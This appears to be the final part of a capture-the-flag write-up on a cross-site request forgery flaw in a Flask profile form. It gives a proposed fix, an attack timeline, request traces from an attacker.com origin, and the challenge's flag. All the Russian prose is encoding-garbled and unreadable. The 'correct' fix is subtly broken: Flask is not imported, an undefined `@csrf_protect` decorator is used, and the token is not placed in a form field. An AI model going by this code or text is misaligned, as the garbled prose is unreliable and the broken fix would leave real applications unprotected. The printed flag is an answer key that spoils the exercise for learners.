### ĞŸÑ€Ğ°Ğ²Ğ¸Ğ»ÑŒĞ½Ğ°Ñ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ:

```python
# Flask with CSRF Protection
from flask_wtf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
csrf = CSRFProtect(app)

@app.route('/update_profile', methods=['POST'])
@csrf_protect  # â† Ğ—Ğ°Ñ‰Ğ¸Ñ‚Ğ° Ğ¾Ñ‚ CSRF
def update_profile():
    # Ğ¤Ğ¾Ñ€Ğ¼Ğ° Ğ´Ğ¾Ğ»Ğ¶Ğ½Ğ° ÑĞ¾Ğ´ĞµÑ€Ğ¶Ğ°Ñ‚ÑŒ {{ csrf_token() }}
    # Ğ˜Ğ½Ğ°Ñ‡Ğµ Ğ·Ğ°Ğ¿Ñ€Ğ¾Ñ Ğ±ÑƒĞ´ĞµÑ‚ Ğ¾Ñ‚ĞºĞ»Ğ¾Ğ½ĞµĞ½
    ...
```

```html
<!-- Ğ¤Ğ¾Ñ€Ğ¼Ğ° Ñ CSRF Ñ‚Ğ¾ĞºĞµĞ½Ğ¾Ğ¼ -->
<form method="POST" action="/update_profile">
  {{ csrf_token() }}  <!-- â† Ğ’Ğ°Ğ¶Ğ½Ğ¾! -->
  <input name="bio" value="...">
  <button type="submit">Update</button>
</form>
```

## ğŸ“Š Ğ¡Ñ€Ğ°Ğ²Ğ½ĞµĞ½Ğ¸Ğµ: Ğ”Ğ¾ Ğ¸ ĞŸĞ¾ÑĞ»Ğµ Ğ·Ğ°Ñ‰Ğ¸Ñ‚Ñ‹

### Ğ‘Ğ•Ğ— Ğ·Ğ°Ñ‰Ğ¸Ñ‚Ñ‹ (Ñ‚ĞµĞºÑƒÑ‰Ğ°Ñ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ):

```
Attacker's Page â†’ Form Submit â†’ Server Accepts âœ“
                  + Cookies
```

### Ğ¡ Ğ·Ğ°Ñ‰Ğ¸Ñ‚Ğ¾Ğ¹ CSRF:

```
Attacker's Page â†’ Form Submit â†’ Server Checks Token â†’ REJECTED âœ—
                  + Cookies       â†‘
                  - NO Token      â””â”€ Token missing or invalid
```

## ğŸ¯ Timeline Ğ°Ñ‚Ğ°ĞºĞ¸

```
T+0s    : Attacker Ñ€ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ¸Ñ€ÑƒĞµÑ‚ÑÑ
T+30s   : Attacker Ğ¸ÑÑĞ»ĞµĞ´ÑƒĞµÑ‚ Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ
T+2m    : Attacker Ğ½Ğ°Ñ…Ğ¾Ğ´Ğ¸Ñ‚ CSRF ÑƒÑĞ·Ğ²Ğ¸Ğ¼Ğ¾ÑÑ‚ÑŒ
T+5m    : Attacker ÑĞ¾Ğ·Ğ´Ğ°ĞµÑ‚ ÑĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚
T+6m    : Attacker Ñ€Ğ°Ğ·Ğ¼ĞµÑ‰Ğ°ĞµÑ‚ exploit.html
T+7m    : Attacker Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ URL Ñ‡ĞµÑ€ĞµĞ· Report
T+8m    : Admin bot Ğ»Ğ¾Ğ³Ğ¸Ğ½Ğ¸Ñ‚ÑÑ
T+9m    : Admin bot Ğ¿Ğ¾ÑĞµÑ‰Ğ°ĞµÑ‚ URL
T+10m   : Form auto-submits
T+11m   : Admin profile updated
T+12m   : Attacker checks /users
T+13m   : FLAG CAPTURED! ğŸ‰
```

## ğŸ”¬ ĞĞ½Ğ°Ğ»Ğ¸Ğ· Ñ‚Ñ€Ğ°Ñ„Ğ¸ĞºĞ°

### Ğ›ĞµĞ³Ğ¸Ñ‚Ğ¸Ğ¼Ğ½Ñ‹Ğ¹ Ğ·Ğ°Ğ¿Ñ€Ğ¾Ñ (Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ ÑĞ°Ğ¼ Ğ¾Ğ±Ğ½Ğ¾Ğ²Ğ»ÑĞµÑ‚ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»ÑŒ):

```
Request Origin:
  - Origin: http://localhost:5000
  - Referer: http://localhost:5000/profile
  - Cookie: session=xyz

Response:
  - 302 Redirect to /profile
  - Profile updated âœ“
```

### CSRF Ğ·Ğ°Ğ¿Ñ€Ğ¾Ñ (Ğ°Ñ‚Ğ°ĞºĞ°):

```
Request Origin:
  - Origin: http://attacker.com          â† ĞŸĞ¾Ğ´Ğ¾Ğ·Ñ€Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾!
  - Referer: http://attacker.com/evil.html  â† ĞŸĞ¾Ğ´Ğ¾Ğ·Ñ€Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾!
  - Cookie: session=xyz                  â† Ğ’Ğ°Ğ»Ğ¸Ğ´Ğ½Ñ‹Ğ¹!

Response:
  - 302 Redirect to /profile
  - Profile updated âœ“                    â† Ğ£ÑĞ·Ğ²Ğ¸Ğ¼Ğ¾ÑÑ‚ÑŒ!
```

### Ğ¡ Ğ·Ğ°Ñ‰Ğ¸Ñ‚Ğ¾Ğ¹ CSRF:

```
Request Origin:
  - Origin: http://attacker.com
  - Referer: http://attacker.com/evil.html
  - Cookie: session=xyz
  - CSRF Token: MISSING                  â† ĞŸÑ€Ğ¸Ñ‡Ğ¸Ğ½Ğ° Ğ¾Ñ‚ĞºĞ°Ğ·Ğ°!

Response:
  - 403 Forbidden
  - Error: "CSRF token missing"
  - Profile NOT updated âœ—
```

## ğŸ† Ğ—Ğ°ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğµ

CSRF Ğ°Ñ‚Ğ°ĞºĞ° ÑƒÑĞ¿ĞµÑˆĞ½Ğ° Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾:

1. âœ“ Ğ‘Ñ€Ğ°ÑƒĞ·ĞµÑ€ Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ cookies
2. âœ“ Ğ¡ĞµÑ€Ğ²ĞµÑ€ Ğ´Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ Ñ‚Ğ¾Ğ»ÑŒĞºĞ¾ cookie Ğ´Ğ»Ñ Ğ°ÑƒÑ‚ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºĞ°Ñ†Ğ¸Ğ¸
3. âœ“ ĞÑ‚ÑÑƒÑ‚ÑÑ‚Ğ²ÑƒĞµÑ‚ Ğ´Ğ¾Ğ¿Ğ¾Ğ»Ğ½Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ°Ñ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ĞºĞ° origin Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ°
4. âœ“ ĞĞµÑ‚ CSRF Ñ‚Ğ¾ĞºĞµĞ½Ğ¾Ğ² Ğ´Ğ»Ñ Ğ²Ğ°Ğ»Ğ¸Ğ´Ğ°Ñ†Ğ¸Ğ¸

**Ğ¤Ğ»Ğ°Ğ³:** `centralctf{csrf_1s_n0t_d3ad_yet}`

Ğ­Ñ‚Ğ° ÑƒÑĞ·Ğ²Ğ¸Ğ¼Ğ¾ÑÑ‚ÑŒ Ğ´ĞµĞ¼Ğ¾Ğ½ÑÑ‚Ñ€Ğ¸Ñ€ÑƒĞµÑ‚ Ğ²Ğ°Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ Ğ¼Ğ½Ğ¾Ğ³Ğ¾ÑƒÑ€Ğ¾Ğ²Ğ½ĞµĞ²Ğ¾Ğ¹ Ğ·Ğ°Ñ‰Ğ¸Ñ‚Ñ‹ Ğ²ĞµĞ±-Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğ¹!